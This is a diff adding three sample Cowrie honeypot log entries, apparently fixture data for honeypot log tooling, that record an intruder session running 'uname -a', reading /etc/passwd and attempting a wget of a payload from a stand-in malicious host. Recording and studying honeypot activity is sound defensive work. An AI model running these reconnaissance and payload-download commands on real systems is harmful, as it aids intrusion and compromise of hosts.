@@ -1,0 +1,3 @@
+{"timestamp": "2025-11-09T10:01:22Z", "eventid": "cowrie.command.input", "src_ip": "203.0.113.10", "input": "uname -a", "username": "root", "session": "abc123", "message": "CMD: uname -a"}
+{"timestamp": "2025-11-09T10:01:25Z", "eventid": "cowrie.command.input", "src_ip": "203.0.113.10", "input": "cat /etc/passwd", "username": "root", "session": "abc123", "message": "CMD: cat /etc/passwd"}
+{"timestamp": "2025-11-09T10:01:40Z", "eventid": "cowrie.command.failed", "src_ip": "203.0.113.10", "input": "wget http://malicious.example/payload.sh", "username": "root", "session": "abc123", "message": "Failed command"}
